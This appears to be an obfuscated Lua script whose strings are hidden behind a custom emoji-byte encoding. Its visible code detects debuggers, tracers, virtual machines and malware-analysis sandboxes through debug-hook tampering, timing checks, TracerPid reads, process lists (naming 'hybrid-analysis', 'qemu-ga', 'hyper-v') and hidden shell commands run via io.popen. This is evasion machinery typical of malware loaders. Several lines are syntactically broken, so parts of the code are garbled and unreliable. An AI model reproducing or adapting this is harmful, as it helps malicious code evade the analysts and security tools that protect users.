do
  local exedir = (function()
    local p = arg and arg[0] or ""
    p = p:match("^(.*)[/\\]") or "."
    return p
  end)()
  local sep = package.config:sub(1, 1)
  local function J(a, b)
    return a .. sep .. b
  end
  local d = J(exedir, "deps")
  local luaPaths = table.concat({
    J(exedir, "?.lua"),
    J(exedir, "?" .. sep .. "init.lua"),
    J(d, "?.lua"),
    J(d, "?" .. sep .. "init.lua")
  }, ";")
  local dllPaths = table.concat({
    J(exedir, "?.dll"),
    J(d, "?.dll"),
    J(d, "?" .. sep .. "?.dll")
  }, ";")
  package.path = luaPaths .. ";" .. package.path
  package.cpath = dllPaths .. ";" .. package.cpath
end
local __K = ""
local __P = true
local __E_SPACE = "\240\159\144\160\240\159\144\153"
local __E_QUOTE = "\240\159\144\160\240\159\140\180"
local __E_BSQUOTE = "\240\159\140\138\240\159\144\172\240\159\165\165\240\159\140\138"
local __E_REDIR = "\240\159\144\160\240\159\144\153\240\159\140\138\240\159\140\138\240\159\140\180\240\159\144\160\240\159\165\165\240\159\140\186\240\159\144\172\240\159\140\186"
local __E_TAIL = "\240\159\144\160\240\159\144\153\240\159\140\138\240\159\166\128\240\159\144\162\240\159\144\160\240\159\166\136\240\159\165\165\240\159\144\179\240\159\144\153\240\159\144\139\240\159\144\179\240\159\165\165\240\159\144\153\240\159\140\136\240\159\144\179\240\159\166\128\240\159\165\165\240\159\140\186\240\159\140\139\240\159\140\136\240\159\165\165\240\159\144\160\240\159\144\139\240\159\140\186\240\159\140\180\240\159\166\128\240\159\144\154\240\159\165\165\240\159\140\138\240\159\144\172\240\159\144\172\240\159\140\138\240\159\144\160\240\159\144\179\240\159\140\180\240\159\144\161\240\159\140\136\240\159\166\128\240\159\140\139\240\159\144\161\240\159\144\162\240\159\144\160\240\159\144\179\240\159\166\128\240\159\165\165\240\159\144\162\240\159\166\136\240\159\140\180\240\159\144\160\240\159\144\162\240\159\144\153\240\159\140\186\240\159\140\186\240\159\166\128\240\159\166\136\240\159\144\160\240\159\166\136\240\159\140\136\240\159\144\154\240\159\166\136\240\159\140\139\240\159\144\154\240\159\144\153"
local __E_READA = "\240\159\144\160\240\159\144\161\240\159\144\161\240\159\144\172"
local __U8 = function(a, b, c, d)
  return string.char(a, b, c, d)
end
local function __T()
  return {
    __U8(240, 159, 140, 186),
    __U8(240, 159, 140, 180),
    __U8(240, 159, 140, 138),
    __U8(240, 159, 140, 139),
    __U8(240, 159, 165, 165),
    __U8(240, 159, 140, 136),
    __U8(240, 159, 144, 162),
    __U8(240, 159, 144, 160),
    __U8(240, 159, 144, 172),
    __U8(240, 159, 144, 139),
    __U8(240, 159, 144, 154),
    __U8(240, 159, 144, 179),
    __U8(240, 159, 144, 161),
    __U8(240, 159, 166, 128),
    __U8(240, 159, 166, 136),
    __U8(240, 159, 144, 153)
  }
end
local function __D(t, k)
  local T = __T()
  local S = function(k)
    k = tostring(k or "")
    local s = 3237919422
    for i = 1, #k do
      s = (s * 1315423911 + k:byte(i)) % 4294967296
    end
    return s
  end
  local M = function(seed)
    return function()
      seed = (1664525 * seed + 1013904223) % 4294967296
      return seed
    end
  end
  local X = function(a, b)
    local r, p = 0, 1
    for _ = 1, 4 do
      local A = a % 2
      local B = b % 2
      if (A + B) % 2 == 1 then
        r = r + p
      end
      a = (a - A) / 2
      b = (b - B) / 2
      p = p * 2
    end
    return r
  end
  if k == nil then
    k = __K
  end
  local key_on = k ~= nil and k ~= ""
  local permute = __P == true and key_on
  local toklen = 4
  local perm = {}
  for n = 0, 15 do
    perm[n] = n
  end
  if permute then
    local r = M(S(tostring(k) .. "|perm"))
    for i = 15, 1, -1 do
      local j = r() % (i + 1)
      perm[i], perm[j] = perm[j], perm[i]
    end
  end
  local dec_map = {}
  for n = 0, 15 do
    local idx = permute and perm[n] or n
    dec_map[T[idx + 1]] = n
  end
  t = (t or ""):gsub("%s+", "")
  local out, n, i, step = {}, #t, 1, toklen * 2
  local ks
  if key_on then
    do
      local r = M(S(tostring(k) .. "|xor"))
      function ks()
        local v = r() % 256
        return (v - v % 16) / 16, v % 16
      end
    end
  end
  while n >= i + step - 1 do
    local a = t:sub(i, i + toklen - 1)
    local b = t:sub(i + toklen, i + step - 1)
    local hi, lo = dec_map[a], dec_map[b]
    if not hi or not lo then
      break
    end
    if ks then
      local kh, kl = ks()
      hi = X(hi, kh)
      lo = X(lo, kl)
    end
    out[#out + 1] = string.char(hi * 16 + lo)
    i = i + step
  end
  return table.concat(out)
end
local va = {}
local vb = package.config:sub(1, 1) == __D("\240\159\140\138\240\159\144\172", __K)
local function vc(vd)
  return (vd or __D("", __K)):lower()
end
local ve = function(vf)
  local vg = {}
  if not vf then
    return vg
  end
  for vh in vf:gmatch("([^\r\n]+)") do
    vg[#vg + 1] = vh
  end
  return vg
end
local function vi(vj)
  local vk, vl = pcall(io.popen, vj)
  if not vk or not vl then
    return (__D("", __K))
  end
  local vm = vl:read((__D("\240\159\144\160\240\159\144\161\240\159\144\161\240\159\144\172", __K)))
  vl:close()
  return vm or __D("", __K)
end
local function vn(vo)
  local vp = io.open(vo, (__D("\240\159\140\186\240\159\140\180\240\159\144\161\240\159\140\138", __K)))
  if vp then
    vp:close()
    return true
  end
  return false
end
local function vq(vr)
  for vs, vt in ipairs(vr) do
    if vn(vt) then
      return vt
    end
  end
  return nil
end
local vu = function(vv)
  return os.getenv(vv)
end
local vw = function()
  return (os.clock() or 0) * 1000
end
local vx = function(vy, vz)
  vy[#vy + 1] = vz
end
va.fa = {
  fb = 25,
  fc = 200000,
  fd = 2,
  fe = 1,
  ff = 2
}
local function v0()
  if type(debug) ~= __D("\240\159\140\186\240\159\140\139\240\159\144\161\240\159\144\172\240\159\144\162\240\159\140\139\240\159\144\161\240\159\144\162\240\159\144\179\240\159\144\179", __K) then
    return false, (__D("\240\159\144\172\240\159\165\165\240\159\144\161\240\159\140\180\240\159\166\128\240\159\140\136\240\159\144\161\240\159\140\138\240\159\144\179\240\159\144\179\240\159\144\154\240\159\166\136\240\159\144\161\240\159\144\162\240\159\166\128\240\159\144\153\240\159\166\128\240\159\144\160\240\159\144\160\240\159\144\179\240\159\140\180\240\159\144\162\240\159\144\172\240\159\144\154", __K))
  end
  local v1 = {
    fg = true,
    fh = true,
    fi = true,
    fj = true,
    fk = true,
    fl = true,
    fm = true,
    fn = true,
    fo = true
  }
  local v2 = debug
  local v3 = pcall(setmetatable, v2, {
    __index = function(v4, v5)
      if v1[v5] then
        errorv5, 2)
      end
      return rawget(v2, v5)
    end,
    __newindex = function()
      error
    end
  })
  if not v3 or not __D("\240\159\144\172\240\159\144\172\240\159\144\161\240\159\140\180\240\159\144\162\240\159\144\139\240\159\144\161\240\159\144\153\240\159\144\179\240\159\144\179\240\159\144\154\240\159\140\186", __K) then
  end
  return v3 ~= false
end
va.fp = v0
local v6 = function()
end
local function v7()
  if type(debug) ~= __D("\240\159\140\186\240\159\140\139\240\159\144\161\240\159\144\172\240\159\144\162\240\159\140\139\240\159\144\161\240\159\144\162\240\159\144\179\240\159\144\179", __K) or not debug.sethook then
    return false
  end
  debug.sethook(v6, __D("\240\159\144\172\240\159\144\172", __K), 0)
  return true
end
va.fq = v7
local function v8()
  if type(debug) ~= __D("\240\159\140\186\240\159\140\139\240\159\144\161\240\159\144\172\240\159\144\162\240\159\140\139\240\159\144\161\240\159\144\162\240\159\144\179\240\159\144\179", __K) or not debug.gethook then
    return false, nil, nil
  end
  local v9, v10, v11 = debug.gethook()
  return v9 ~= nil, v10, v11
end
va.fr = v8
local function v12()
  if type(debug) ~= __D("\240\159\140\186\240\159\140\139\240\159\144\161\240\159\144\172\240\159\144\162\240\159\140\139\240\159\144\161\240\159\144\162\240\159\144\179\240\159\144\179", __K) or not debug.gethook then
    return false
  end
  local v13 = debug.gethook()
  return v13 == v6
end
va.fs = v12
local function v14(v15, v16)
  local v15 = v15 or va.fa.fb
  local v16 = v16 or va.fa.fc
  local v17 = vw()
  local v18 = 0
  for v19 = 1, v16 do
    v18 = v18 + v19
  end
  local v20 = vw() - v17
  return v15 < v20, v20
end
va.ft = v14
local v21 = function(v22)
  local v23, v24 = pcall(string.dump, v22, true)
  if v23 then
    return v24
  end
  v23, v24 = pcall(string.dump, v22)
  return v23 and v24 or nil
end
local function v25(v26, v27)
  local v28 = v21(v26)
  return v28 ~= nil and v28 == v27
end
va.fu = v21
va.fv = v25
local v29 = {
  __D("\240\159\144\172\240\159\140\186\240\159\144\161\240\159\140\180\240\159\144\162\240\159\140\139\240\159\144\161\240\159\140\138\240\159\144\179\240\159\144\179\240\159\144\154\240\159\166\136\240\159\144\161\240\159\144\162\240\159\166\128\240\159\144\153", __K),
  __D("\240\159\144\172\240\159\144\172\240\159\144\161\240\159\144\154\240\159\144\162\240\159\140\180\240\159\144\161\240\159\165\165\240\159\144\179\240\159\165\165\240\159\144\153\240\159\144\172\240\159\166\136\240\159\144\139\240\159\166\128\240\159\144\153\240\159\144\162\240\159\140\186\240\159\144\179\240\159\144\162", __K),
  __D("\240\159\144\172\240\159\140\139\240\159\144\161\240\159\144\160\240\159\144\162\240\159\140\139\240\159\166\136\240\159\165\165\240\159\144\179\240\159\166\136\240\159\144\154\240\159\165\165\240\159\166\136\240\159\144\162\240\159\140\180\240\159\144\139", __K),
  __D("\240\159\140\186\240\159\140\136\240\159\166\136\240\159\165\165\240\159\144\162\240\159\144\139\240\159\144\161\240\159\140\139\240\159\144\179\240\159\144\160\240\159\144\154\240\159\144\172\240\159\140\138\240\159\140\138\240\159\166\128\240\159\166\128\240\159\144\162\240\159\140\186\240\159\144\160\240\159\144\162\240\159\166\128\240\159\166\136\240\159\144\172\240\159\140\139\240\159\144\179\240\159\166\128\240\159\144\162\240\159\140\139\240\159\165\165\240\159\140\138", __K),
  (__D("\240\159\140\186\240\159\140\136\240\159\166\136\240\159\165\165\240\159\144\162\240\159\144\139\240\159\144\161\240\159\140\139\240\159\144\179\240\159\144\160\240\159\144\154\240\159\144\172\240\159\140\138\240\159\144\172\240\159\166\128\240\159\166\136\240\159\140\136\240\159\140\186\240\159\144\160\240\159\140\139\240\159\140\180\240\159\140\180\240\159\140\186\240\159\144\153", __K))
}
local function v30()
  for v31, v32 in ipairs(v29) do
    if package.loaded[v32] then
      return v32
    end
    local v33 = pcall(require, v32)
    if v33 then
      return v32
    end
  end
  return nil
end
va.fw = v30
local function v34()
  local v35 = io.open
  if not v35 then
    return false
  end
  local v36 = v35:read((__D("\240\159\144\160\240\159\144\161\240\159\144\161\240\159\144\172", __K)))
  v35:close()
  local v37 = v36 and v36:match("TracerPid:%s*(%d+)")
  return v37 and tonumber(v37) > 0 or false
end
va.fx = v34
local v38 = {
  __D("\240\159\144\172\240\159\144\162\240\159\144\161\240\159\144\179\240\159\144\162\240\159\140\139", __K),
  __D("\240\159\144\172\240\159\144\172\240\159\144\161\240\159\144\154\240\159\144\162\240\159\140\180\240\159\144\161\240\159\144\179", __K),
  __D("\240\159\144\172\240\159\144\179\240\159\144\161\240\159\144\179\240\159\144\162\240\159\144\162", __K),
  __D("\240\159\144\172\240\159\144\179\240\159\144\161\240\159\144\179\240\159\144\162\240\159\144\162\240\159\140\138\240\159\140\186\240\159\144\172\240\159\144\160", __K),
  __D("\240\159\144\172\240\159\144\179\240\159\144\161\240\159\144\179\240\159\144\162\240\159\144\162\240\159\144\161\240\159\144\172", __K),
  __D("\240\159\144\172\240\159\144\179\240\159\144\161\240\159\144\179\240\159\144\162\240\159\144\162\240\159\144\161\240\159\144\172\240\159\144\172\240\159\144\161\240\159\140\139\240\159\140\186", __K),
  __D("\240\159\140\186\240\159\144\160\240\159\140\138\240\159\166\136\240\159\140\180\240\159\140\180\240\159\144\161\240\159\140\138\240\159\144\179\240\159\165\165\240\159\144\154\240\159\165\165", __K),
  __D("\240\159\140\186\240\159\144\160\240\159\140\138\240\159\165\165\240\159\140\180\240\159\140\139\240\159\144\161\240\159\140\138\240\159\144\179\240\159\165\165\240\159\144\154\240\159\165\165", __K),
  __D("\240\159\144\172\240\159\140\138\240\159\144\161\240\159\144\154\240\159\144\162\240\159\144\161\240\159\166\136\240\159\140\180\240\159\144\179\240\159\144\160\240\159\144\154\240\159\166\136\240\159\166\136\240\159\144\139", __K),
  __D("\240\159\144\172\240\159\140\139\240\159\144\161\240\159\166\128\240\159\140\136\240\159\144\139\240\159\166\136\240\159\166\136\240\159\144\160\240\159\144\139", __K),
  __D("\240\159\144\172\240\159\144\162\240\159\144\161\240\159\144\139\240\159\144\162\240\159\140\138\240\159\144\161\240\159\140\138\240\159\144\160\240\159\165\165\240\159\144\154\240\159\144\160", __K),
  __D("\240\159\140\186\240\159\140\180\240\159\144\161\240\159\144\172\240\159\144\162\240\159\140\180\240\159\144\161\240\159\144\161\240\159\144\160\240\159\165\165\240\159\144\154\240\159\144\172", __K),
  __D("\240\159\140\186\240\159\140\180\240\159\140\138\240\159\140\138", __K),
  __D("\240\159\144\172\240\159\144\160\240\159\144\161\240\159\140\180\240\159\140\136\240\159\140\136\240\159\166\136\240\159\166\136\240\159\144\179\240\159\144\179\240\159\144\153\240\159\166\136", __K),
  __D("\240\159\140\186\240\159\144\162\240\159\144\161\240\159\140\139\240\159\144\162\240\159\144\160\240\159\144\161\240\159\140\138\240\159\144\179\240\159\165\165\240\159\144\154\240\159\165\165", __K),

  __D("\240\159\144\172\240\159\166\128\240\159\144\161\240\159\144\139\240\159\144\162\240\159\166\128\240\159\144\161\240\159\144\161\240\159\144\160\240\159\144\160\240\159\144\154\240\159\144\172\240\159\166\136\240\159\144\172\240\159\166\128\240\159\144\153\240\159\144\162\240\159\144\154\240\159\144\160\240\159\166\136\240\159\140\180\240\159\166\136", __K),
  __D("\240\159\144\172\240\159\140\136\240\159\166\136\240\159\140\138\240\159\144\162\240\159\140\138\240\159\144\161\240\159\140\138\240\159\144\179\240\159\140\186", __K),
  __D("\240\159\144\172\240\159\140\136\240\159\166\136\240\159\140\138\240\159\144\162\240\159\140\138\240\159\144\161\240\159\140\138\240\159\144\179\240\159\140\186\240\159\144\139\240\159\140\139\240\159\144\161\240\159\144\154\240\159\166\128\240\159\140\180\240\159\140\136\240\159\144\161\240\159\144\179\240\159\166\128\240\159\140\180\240\159\166\136\240\159\140\186\240\159\144\154", __K),
  __D("\240\159\140\186\240\159\166\128\240\159\166\136\240\159\144\179\240\159\140\136\240\159\140\139\240\159\144\161\240\159\144\161\240\159\144\179\240\159\140\138\240\159\144\154\240\159\144\172", __K),
  __D("\240\159\144\172\240\159\144\172\240\159\166\136\240\159\144\179\240\159\140\136\240\159\140\139\240\159\144\161\240\159\144\161\240\159\144\179\240\159\140\138\240\159\144\154\240\159\144\172", __K),
  __D("\240\159\140\186\240\159\166\128\240\159\166\136\240\159\140\139\240\159\140\136\240\159\144\139\240\159\144\161\240\159\140\138\240\159\144\179\240\159\144\139\240\159\144\154\240\159\165\165", __K),
  __D("\240\159\140\186\240\159\144\153\240\159\166\136\240\159\140\138\240\159\144\162\240\159\144\179\240\159\144\161\240\159\144\160\240\159\144\179\240\159\144\154\240\159\144\154\240\159\140\136\240\159\166\136\240\159\144\172", __K),
  __D("\240\159\140\186\240\159\144\153\240\159\166\136\240\159\140\138\240\159\144\162\240\159\144\179\240\159\144\161\240\159\144\160\240\159\144\179\240\159\144\179\240\159\144\153\240\159\144\154\240\159\144\161\240\159\140\180", __K),
  __D("\240\159\140\186\240\159\144\162\240\159\144\161\240\159\140\139\240\159\140\136\240\159\140\139\240\159\144\161\240\159\165\165\240\159\144\160\240\159\140\138\240\159\144\154\240\159\144\154\240\159\166\136\240\159\166\128\240\159\140\180\240\159\144\139\240\159\144\162\240\159\166\128", __K),
  __D("\240\159\144\172\240\159\140\136\240\159\144\161\240\159\140\139\240\159\144\162\240\159\140\180\240\159\144\161\240\159\140\138\240\159\144\179\240\159\144\153\240\159\144\154\240\159\144\172\240\159\144\161\240\159\144\153", __K),
  __D("\240\159\140\186\240\159\140\139\240\159\144\161\240\159\165\165\240\159\140\136\240\159\140\136\240\159\144\161\240\159\140\138\240\159\144\160\240\159\144\179\240\159\144\154\240\159\140\139\240\159\144\161\240\159\140\180", __K),
  __D("\240\159\144\172\240\159\140\136\240\159\144\161\240\159\140\139\240\159\144\162\240\159\144\161\240\159\144\161\240\159\165\165\240\159\144\179\240\159\144\154\240\159\144\154\240\159\140\136\240\159\166\136\240\159\144\172", __K),
  __D("\240\159\140\186\240\159\140\180\240\159\144\161\240\159\144\160\240\159\144\162\240\159\144\154\240\159\144\161\240\159\140\136\240\159\144\179\240\159\166\128\240\159\144\154\240\159\144\162", __K),
  __D("\240\159\144\172\240\159\144\154\240\159\166\136\240\159\140\186\240\159\144\162\240\159\140\138\240\159\144\161\240\159\140\136\240\159\144\179\240\159\166\128\240\159\144\154\240\159\144\162\240\159\166\136\240\159\166\136\240\159\140\180\240\159\166\128\240\159\144\162\240\159\144\162\240\159\144\179\240\159\144\162", __K),
  __D("\240\159\144\172\240\159\144\161\240\159\144\161\240\159\140\180\240\159\144\162\240\159\166\128\240\159\166\136\240\159\144\160\240\159\144\179\240\159\140\186\240\159\144\154\240\159\144\162\240\159\166\136\240\159\140\136\240\159\166\128\240\159\144\139\240\159\144\162\240\159\144\162\240\159\144\179\240\159\140\186", __K),
  __D("\240\159\144\172\240\159\144\161\240\159\144\161\240\159\140\180\240\159\144\162\240\159\166\128\240\159\144\161\240\159\144\179\240\159\144\179\240\159\166\128\240\159\144\153\240\159\144\154", __K),
  __D("\240\159\144\172\240\159\166\128\240\159\166\136\240\159\144\160\240\159\144\162\240\159\144\139\240\159\144\161\240\159\144\153\240\159\144\179\240\159\166\128\240\159\144\154\240\159\140\136", __K),
  __D("\240\159\144\172\240\159\166\128\240\159\144\161\240\159\144\172\240\159\140\136\240\159\140\136\240\159\144\161\240\159\165\165", __K),
  __D("\240\159\144\172\240\159\144\154\240\159\144\161\240\159\166\128\240\159\140\136\240\159\140\138\240\159\166\136\240\159\144\179\240\159\144\160\240\159\144\179\240\159\144\154\240\159\144\162", __K),
  __D("\240\159\144\172\240\159\144\154\240\159\144\161\240\159\166\128\240\159\140\136\240\159\140\138\240\159\165\165\240\159\144\139\240\159\144\160\240\159\165\165\240\159\144\153\240\159\144\172\240\159\166\136\240\159\144\172", __K),
  __D("\240\159\140\186\240\159\140\139\240\159\144\161\240\159\144\139\240\159\140\136\240\159\140\139\240\159\144\161\240\159\165\165\240\159\144\179\240\159\140\186\240\159\144\153\240\159\140\186\240\159\166\136\240\159\144\139\240\159\140\180\240\159\144\139\240\159\144\162\240\159\144\154\240\159\144\160\240\159\144\154", __K),
  __D("\240\159\144\172\240\159\140\136\240\159\144\161\240\159\144\172\240\159\144\162\240\159\144\161\240\159\144\161\240\159\144\160\240\159\144\179\240\159\166\128\240\159\144\154\240\159\144\162\240\159\144\161\240\159\144\154\240\159\166\128\240\159\140\136\240\159\144\162\240\159\140\136\240\159\144\160\240\159\144\154\240\159\140\180\240\159\144\172\240\159\144\172\240\159\144\172\240\159\144\160\240\159\144\172", __K),
  "hybrid%-analysis",
  __D("\240\159\140\186\240\159\140\139\240\159\166\136\240\159\140\138\240\159\144\162\240\159\140\138\240\159\144\161\240\159\144\161\240\159\144\179\240\159\166\136\240\159\144\154\240\159\144\172", __K),
  __D("\240\159\140\186\240\159\140\136\240\159\144\161\240\159\140\138\240\159\144\162\240\159\144\179\240\159\166\136\240\159\166\128\240\159\144\160\240\159\140\138\240\159\144\154\240\159\144\172\240\159\144\161\240\159\144\153\240\159\140\180\240\159\144\154\240\159\144\162\240\159\144\154\240\159\144\160\240\159\140\136\240\159\140\180\240\159\166\136", __K),
  __D("\240\159\140\186\240\159\140\136\240\159\144\161\240\159\140\138\240\159\144\162\240\159\144\179\240\159\166\136\240\159\166\128\240\159\144\160\240\159\144\160\240\159\144\153\240\159\166\136\240\159\166\136\240\159\166\128\240\159\140\180\240\159\165\165", __K),
  __D("\240\159\140\186\240\159\140\136\240\159\144\161\240\159\144\153\240\159\140\136\240\159\140\180\240\159\144\161\240\159\140\139\240\159\144\179\240\159\166\128\240\159\144\154\240\159\144\139\240\159\144\161\240\159\144\154\240\159\166\128\240\159\166\128", __K),
  __D("\240\159\140\186\240\159\140\136\240\159\144\161\240\159\144\153\240\159\140\136\240\159\144\139\240\159\166\136\240\159\144\179\240\159\144\160\240\159\144\161\240\159\144\154\240\159\144\161", __K),
  __D("\240\159\140\186\240\159\140\136\240\159\144\161\240\159\144\161\240\159\144\162\240\159\144\162\240\159\166\136\240\159\165\165\240\159\144\160\240\159\144\160\240\159\144\154\240\159\144\154\240\159\144\161\240\159\144\154\240\159\166\128\240\159\140\180\240\159\140\136\240\159\144\161\240\159\144\179\240\159\166\128\240\159\140\180\240\159\144\162\240\159\144\172\240\159\144\153\240\159\144\179\240\159\144\154", __K),
  __D("\240\159\140\186\240\159\140\136\240\159\144\161\240\159\144\153\240\159\140\136\240\159\144\154\240\159\144\161\240\159\144\161\240\159\144\160\240\159\165\165\240\159\144\154\240\159\144\172\240\159\144\161\240\159\140\136\240\159\140\180\240\159\144\139\240\159\144\162\240\159\144\179\240\159\144\179\240\159\144\172", __K),
  "qemu%-ga"
}
local function v39()
  local v40 = __D("", __K)
  if vb then
    v40 = vi
    if #v40 == 0 then
      v40 = vi((__D("\240\159\140\186\240\159\144\162\240\159\144\161\240\159\144\153\240\159\144\162\240\159\140\138\240\159\144\161\240\159\144\160\240\159\140\186\240\159\144\172\240\159\144\153\240\159\144\179\240\159\144\161\240\159\144\153\240\159\166\128\240\159\144\160\240\159\144\162\240\159\166\136\240\159\144\160\240\159\144\153\240\159\166\128\240\159\140\186\240\159\140\186\240\159\144\153\240\159\140\186\240\159\140\139\240\159\144\162\240\159\140\136\240\159\165\165\240\159\140\138\240\159\140\186\240\159\166\136\240\159\166\136\240\159\144\153\240\159\166\136\240\159\165\165\240\159\165\165\240\159\144\162\240\159\144\153\240\159\166\136\240\159\144\179\240\159\144\160\240\159\144\172\240\159\144\153\240\159\140\180\240\159\140\186\240\159\140\136\240\159\144\179\240\159\140\180\240\159\140\139\240\159\144\139\240\159\140\136\240\159\140\186\240\159\144\154\240\159\166\128\240\159\165\165\240\159\144\160\240\159\144\179\240\159\140\180\240\159\144\153\240\159\144\179\240\159\140\139\240\159\166\128\240\159\166\136\240\159\144\172\240\159\144\172\240\159\140\139\240\159\140\139\240\159\144\179\240\159\144\160\240\159\140\139\240\159\165\165\240\159\140\138\240\159\144\172\240\159\165\165\240\159\166\136\240\159\144\160\240\159\144\172\240\159\144\179\240\159\144\162\240\159\166\136\240\159\140\136\240\159\144\154\240\159\144\153\240\159\140\136\240\159\140\180", __K)))
    end
  else
    v40 = vi
  end
  v40 = vc(v40)
  for v41, v42 in ipairs(v38) do
    if v40:find(v42, 1, true) then
      return v42
    end
  end
  return nil
end
va.fy = v39
local v43 = {
  __D("\240\159\165\165\240\159\144\172\240\159\144\160\240\159\144\179\240\159\140\139\240\159\144\179\240\159\144\179\240\159\166\136\240\159\144\161\240\159\165\165\240\159\166\128\240\159\144\172\240\159\144\179\240\159\165\165\240\159\144\154\240\159\144\160\240\159\144\139\240\159\144\179\240\159\144\161\240\159\144\154", __K),
  __D("\240\159\165\165\240\159\144\172\240\159\144\160\240\159\144\179\240\159\140\139\240\159\144\179\240\159\144\160\240\159\144\161\240\159\144\161\240\159\144\179\240\159\166\128\240\159\140\186\240\159\144\179\240\159\166\136\240\159\144\153\240\159\166\128", __K),
  __D("\240\159\165\165\240\159\144\172\240\159\144\160\240\159\144\179\240\159\140\139\240\159\144\179\240\159\144\160\240\159\144\162\240\159\166\136\240\159\144\139\240\159\166\128\240\159\166\136\240\159\144\160\240\159\144\153\240\159\144\154\240\159\140\136\240\159\140\139\240\159\144\161\240\159\166\136\240\159\144\172\240\159\144\154\240\159\144\154\240\159\140\138\240\159\166\128\240\159\166\136\240\159\144\139\240\159\140\139\240\159\144\139\240\159\144\172\240\159\140\180", __K),
  __D("\240\159\165\165\240\159\140\139\240\159\144\179\240\159\140\139\240\159\144\139\240\159\144\161\240\159\144\160\240\159\140\138\240\159\144\161\240\159\166\128\240\159\166\128\240\159\144\153\240\159\144\179\240\159\144\172\240\159\144\153\240\159\140\139\240\159\144\139\240\159\140\186\240\159\166\136\240\159\144\162\240\159\144\154\240\159\144\161\240\159\140\138\240\159\144\172\240\159\166\136\240\159\144\160\240\159\144\139\240\159\144\160\240\159\144\172\240\159\144\160\240\159\140\138\240\159\140\186\240\159\140\186\240\159\144\154\240\159\144\161\240\159\140\138\240\159\144\172\240\159\140\138\240\159\166\128\240\159\165\165\240\159\166\136\240\159\140\138", __K),

  __D("\240\159\165\165\240\159\140\136\240\159\144\179\240\159\140\138\240\159\144\139\240\159\140\138\240\159\144\160\240\159\140\138\240\159\166\136\240\159\140\186", __K),
  __D("\240\159\165\165\240\159\140\136\240\159\144\179\240\159\140\138\240\159\144\139\240\159\140\138\240\159\144\160\240\159\140\138\240\159\166\136\240\159\140\186\240\159\140\180\240\159\140\136\240\159\144\160\240\159\144\154\240\159\144\154\240\159\140\139\240\159\140\139\240\159\144\161\240\159\144\161\240\159\144\172\240\159\144\154\240\159\165\165\240\159\140\138\240\159\144\162", __K),
  __D("\240\159\140\138\240\159\144\153\240\159\144\160\240\159\140\139\240\159\144\139\240\159\144\160\240\159\144\179\240\159\140\139\240\159\144\161\240\159\144\160\240\159\166\128\240\159\140\136\240\159\144\179\240\159\140\186\240\159\144\154\240\159\166\136", __K),
  (__D("\240\159\165\165\240\159\144\172\240\159\144\179\240\159\144\160\240\159\144\139\240\159\144\162\240\159\144\179\240\159\140\139\240\159\166\136\240\159\144\160\240\159\166\128\240\159\144\172\240\159\144\179\240\159\144\153\240\159\144\153\240\159\140\180\240\159\144\139\240\159\140\138", __K))
}
local function v44()
  for v45, v46 in ipairs(v43) do
    local v47 = vu(v46)
    if v47 and #v47 > 0 then
      return v46, v47
    end
  end
  return nil
end
va.fz = v44
local v48 = {
  __D("\240\159\140\186\240\159\140\136\240\159\144\161\240\159\144\153\240\159\140\136\240\159\144\154\240\159\144\161\240\159\144\161\240\159\144\160\240\159\165\165\240\159\144\154\240\159\144\172", __K),
  __D("\240\159\140\186\240\159\140\136\240\159\144\161\240\159\140\139\240\159\140\136\240\159\140\139\240\159\166\136\240\159\140\138\240\159\144\160\240\159\144\179\240\159\144\154\240\159\144\160\240\159\166\136\240\159\165\165\240\159\166\128\240\159\144\139\240\159\144\162\240\159\144\162\240\159\144\179\240\159\140\186", __K),
  __D("\240\159\140\186\240\159\140\136\240\159\144\161\240\159\140\138\240\159\144\162\240\159\144\179\240\159\166\136\240\159\166\128", __K),

  "hyper%-v",
  __D("\240\159\140\186\240\159\144\154\240\159\144\161\240\159\144\160\240\159\144\162\240\159\166\136\240\159\166\136\240\159\165\165", __K),
  __D("\240\159\144\172\240\159\166\136\240\159\166\136\240\159\166\136\240\159\144\162\240\159\166\136", __K),
  __D("\240\159\140\186\240\159\144\153\240\159\144\161\240\159\144\172\240\159\140\136\240\159\140\139\240\159\144\161\240\159\144\161\240\159\144\179\240\159\144\153\240\159\144\154\240\159\144\139\240\159\166\136\240\159\144\162\240\159\166\128\240\159\166\136\240\159\140\136\240\159\166\136", __K),
  __D("\240\159\140\186\240\159\144\160\240\159\144\161\240\159\144\160\240\159\144\162\240\159\144\160", __K),
  __D("\240\159\144\172\240\159\144\179\240\159\144\161\240\159\166\128\240\159\144\162\240\159\144\160\240\159\144\161\240\159\140\139\240\159\144\160\240\159\144\160\240\159\144\154\240\159\144\172\240\159\166\136\240\159\144\179", __K),
  (__D("\240\159\144\172\240\159\140\180\240\159\144\161\240\159\140\180\240\159\144\162\240\159\144\139\240\159\144\161\240\159\166\128\240\159\144\160\240\159\140\138", __K))
}
local function v49()
  local v50 = {}
  if vb then
    local v51 = vc(vi
    local v52 = vc(vi
    if #v51 > 0 then
      vx(v50, v51)
    end
    if #v52 > 0 then
      vx(v50, v52)
    end
  else
    for v53, v54 in ipairs({


      __D("\240\159\144\160\240\159\140\138\240\159\166\136\240\159\165\165\240\159\140\136\240\159\140\138\240\159\166\136\240\159\144\160\240\159\140\186\240\159\166\128\240\159\144\154\240\159\144\161\240\159\166\136\240\159\165\165\240\159\166\128\240\159\140\136\240\159\140\136\240\159\166\136\240\159\144\179\240\159\140\136\240\159\140\136\240\159\144\154\240\159\144\172\240\159\144\162\240\159\144\179\240\159\144\179\240\159\144\162\240\159\144\160\240\159\144\161\240\159\144\139\240\159\144\172\240\159\140\136\240\159\140\138\240\159\140\139\240\159\140\186\240\159\140\180\240\159\165\165\240\159\140\139\240\159\144\154\240\159\140\139\240\159\144\160\240\159\140\186\240\159\140\186\240\159\166\136\240\159\140\180\240\159\140\136\240\159\144\139\240\159\144\160\240\159\144\162\240\159\165\165\240\159\144\162\240\159\144\153\240\159\140\186\240\159\144\153\240\159\166\128\240\159\144\162\240\159\144\160\240\159\166\136\240\159\166\128\240\159\166\128", __K),

    }) do
      local v55 = io.open(v54, (__D("\240\159\140\186\240\159\140\180", __K)))
      if v55 then
        local v56 = v55:read((__D("\240\159\144\160\240\159\144\161\240\159\144\161\240\159\144\154", __K))) or __D("", __K)
        v55:close()
        if #v56 > 0 then
          vx(v50, vc(v56))
        end
      end
    end
